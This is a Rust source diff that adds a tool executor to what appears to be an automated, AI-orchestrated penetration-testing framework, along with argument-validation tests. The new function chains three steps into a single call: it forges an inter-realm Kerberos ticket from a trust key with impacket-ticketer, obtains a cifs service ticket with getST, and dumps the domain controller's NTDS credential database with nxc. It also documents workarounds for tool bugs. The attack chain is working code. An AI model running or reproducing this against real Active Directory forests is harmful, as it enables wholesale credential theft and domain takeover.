@@ -1,6 +1,6 @@
 //! Trust / cross-forest tool executors.
 
-use anyhow::Result;
+use anyhow::{Context, Result};
 use serde_json::Value;
 
 use crate::args::{optional_str, required_str};
@@ -91,6 +91,163 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
         .timeout_secs(120)
         .execute()
         .await
+}
+
+/// Forge an inter-realm Kerberos ticket, request a TGS for the target DC,
+/// then run `nxc smb --ntds` against it — all in a single worker invocation.
+///
+/// This wraps the impacket forge-and-present workaround for the cross-realm
+/// referral bug (fortra/impacket#315) into ONE deterministic tool call so
+/// the orchestrator can dispatch every parameter directly, without laundering
+/// the trust key / SIDs through an LLM. All three steps share a tempdir as
+/// cwd so the ccache files produced are colocated on disk.
+///
+/// Why three steps and not two:
+/// 1. **ticketer** forges the inter-realm TGT (krbtgt/<target> issued by
+///    <source>) using the trust key. Forced to **NT-only** — impacket has a
+///    salt-derivation bug on trust accounts that yields
+///    `KRB_AP_ERR_BAD_INTEGRITY` whenever the AES key is supplied alongside
+///    the NT hash. The NT-only ticket validates against modern KDCs.
+/// 2. **getST** presents that inter-realm TGT to the target KDC and requests
+///    a TGS for `cifs/<target>`. This step is required because the impacket
+///    referral path is broken — `secretsdump -k` against a cross-realm TGT
+///    sends the referral to the wrong KDC and fails.
+/// 3. **nxc smb --ntds** dumps NTDS using the TGS via Kerberos cache.
+///    `impacket-secretsdump` is unusable here: its DRSUAPI bind rejects
+///    cross-realm TGS auth with `Bind context rejected: invalid_checksum`.
+///    netexec's `--ntds vss` path uses a different bind sequence that
+///    accepts the cross-realm credential.
+///
+/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_domain`,
+///                `target` (DC hostname for cifs/<target> SPN matching)
+/// Optional args: `target_sid` (kept for parity), `username` (default
+///                "Administrator"), `extra_sid` (child→parent only — omit for
+///                cross-forest), `dc_ip` (passed as -dc-ip and to nxc).
+pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
+    let trust_key = required_str(args, "trust_key")?;
+    let source_sid = required_str(args, "source_sid")?;
+    let source_domain = required_str(args, "source_domain")?;
+    let target_domain = required_str(args, "target_domain")?;
+    let target = required_str(args, "target")?;
+    // target_sid currently unused by ticketer but accepted for API parity
+    // with create_inter_realm_ticket; ticketer derives the realm from -domain.
+    let _target_sid = optional_str(args, "target_sid");
+    let username = optional_str(args, "username")
+        .unwrap_or("Administrator")
+        .to_string();
+    let extra_sid = optional_str(args, "extra_sid");
+    let dc_ip = optional_str(args, "dc_ip");
+
+    let nt = credentials::nt_hash_only(trust_key);
+
+    let tempdir = tempfile::tempdir().context("failed to create tempdir for inter-realm forge")?;
+    let cwd = tempdir.path().to_path_buf();
+
+    // --- Step 1: forge inter-realm TGT (NT-only) ---
+    let krbtgt_spn = format!("krbtgt/{target_domain}");
+    let mut ticketer = CommandBuilder::new("impacket-ticketer")
+        .flag("-nthash", nt)
+        .flag("-domain-sid", source_sid)
+        .flag("-domain", source_domain);
+    if let Some(es) = extra_sid {
+        ticketer = ticketer.flag("-extra-sid", es);
+    }
+    let ticketer_output = ticketer
+        .flag("-spn", krbtgt_spn)
+        .arg(&username)
+        .current_dir(&cwd)
+        .timeout_secs(120)
+        .execute()
+        .await?;
+
+    if !ticketer_output.success {
+        return Ok(ticketer_output);
+    }
+
+    let tgt_ccache = cwd.join(format!("{username}.ccache"));
+    if !tgt_ccache.exists() {
+        anyhow::bail!(
+            "impacket-ticketer reported success but {} was not produced",
+            tgt_ccache.display()
+        );
+    }
+
+    // --- Step 2: present inter-realm TGT, request TGS for cifs/<target> ---
+    let cifs_spn = format!("cifs/{target}");
+    let target_principal = format!("{target_domain}/{username}");
+    let mut getst = CommandBuilder::new("impacket-getST")
+        .arg("-k")
+        .arg("-no-pass")
+        .flag("-spn", &cifs_spn);
+    if let Some(ip) = dc_ip {
+        getst = getst.flag("-dc-ip", ip);
+    }
+    let getst_output = getst
+        .arg(&target_principal)
+        .env("KRB5CCNAME", tgt_ccache.to_string_lossy().into_owned())
+        .current_dir(&cwd)
+        .timeout_secs(120)
+        .execute()
+        .await?;
+
+    if !getst_output.success {
+        return Ok(ToolOutput {
+            stdout: format!(
+                "=== impacket-ticketer ===\n{}\n=== impacket-getST ===\n{}",
+                ticketer_output.stdout, getst_output.stdout
+            ),
+            stderr: format!(
+                "--- ticketer stderr ---\n{}\n--- getST stderr ---\n{}",
+                ticketer_output.stderr, getst_output.stderr
+            ),
+            exit_code: getst_output.exit_code,
+            success: false,
+        });
+    }
+
+    // getST writes "<user>@<spn-with-_-instead-of-/>@<REALM>.ccache".
+    let tgs_filename = format!(
+        "{username}@{}@{}.ccache",
+        cifs_spn.replace('/', "_"),
+        target_domain.to_uppercase()
+    );
+    let tgs_ccache = cwd.join(&tgs_filename);
+    if !tgs_ccache.exists() {
+        anyhow::bail!(
+            "impacket-getST reported success but {} was not produced",
+            tgs_ccache.display()
+        );
+    }
+
+    // --- Step 3: nxc smb --ntds via the TGS ccache ---
+    let nxc_host = dc_ip.unwrap_or(target);
+    let dump_output = CommandBuilder::new("nxc")
+        .arg("smb")
+        .arg(nxc_host)
+        .arg("-k")
+        .arg("--use-kcache")
+        .arg("--ntds")
+        .arg("vss")
+        .env("KRB5CCNAME", tgs_ccache.to_string_lossy().into_owned())
+        .current_dir(&cwd)
+        .timeout_secs(600)
+        .execute()
+        .await?;
+
+    let stdout = format!(
+        "=== impacket-ticketer ===\n{}\n=== impacket-getST ===\n{}\n=== nxc smb --ntds ===\n{}",
+        ticketer_output.stdout, getst_output.stdout, dump_output.stdout
+    );
+    let stderr = format!(
+        "--- ticketer stderr ---\n{}\n--- getST stderr ---\n{}\n--- nxc stderr ---\n{}",
+        ticketer_output.stderr, getst_output.stderr, dump_output.stderr
+    );
+    Ok(ToolOutput {
+        stdout,
+        stderr,
+        exit_code: dump_output.exit_code,
+        success: dump_output.success,
+    })
 }
 
 /// Look up domain SIDs using impacket-lookupsid.
@@ -489,6 +646,51 @@ mod tests {
             "extra_sid": "S-1-5-21-222-519"
         });
         assert!(create_inter_realm_ticket(&args).await.is_ok());
+    }
+
+    // --- forge_inter_realm_and_dump (arg validation only — full flow needs
+    //     real impacket binaries and a tempdir-aware mock executor) ---
+
+    #[test]
+    fn forge_inter_realm_and_dump_missing_trust_key() {
+        let args = json!({
+            "source_sid": "S-1-5-21-111",
+            "source_domain": "child.contoso.local",
+            "target_domain": "contoso.local",
+            "target": "dc01.contoso.local"
+        });
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("trust_key"));
+    }
+
+    #[test]
+    fn forge_inter_realm_and_dump_missing_source_sid() {
+        let args = json!({
+            "trust_key": "aabbccdd",
+            "source_domain": "child.contoso.local",
+            "target_domain": "contoso.local",
+            "target": "dc01.contoso.local"
+        });
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("source_sid"));
+    }
+
+    #[test]
+    fn forge_inter_realm_and_dump_missing_target() {
+        let args = json!({
+            "trust_key": "aabbccdd",
+            "source_sid": "S-1-5-21-111",
+            "source_domain": "child.contoso.local",
+            "target_domain": "contoso.local"
+        });
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("target"));
     }
 
     #[tokio::test]
